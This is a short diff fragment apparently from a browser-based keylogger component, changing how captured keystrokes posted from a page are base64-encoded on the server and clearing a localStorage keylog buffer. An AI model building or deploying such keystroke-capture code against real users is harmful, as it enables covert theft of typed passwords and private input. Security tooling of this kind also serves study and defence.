@@ -4,7 +4,7 @@
         - keylogger(local + Not IME)
             gum_postkeylogs()
         and
-            browserinfo['keylogs'] = b64encode(str(request.forms.get('keylogs')))
+            browserinfo['keylogs'] = b64ens(request.forms.keylogs)
  */
 if ('gum_keyslog' in window.localStorage){
     window.localStorage.setItem('gum_keyslog', '')
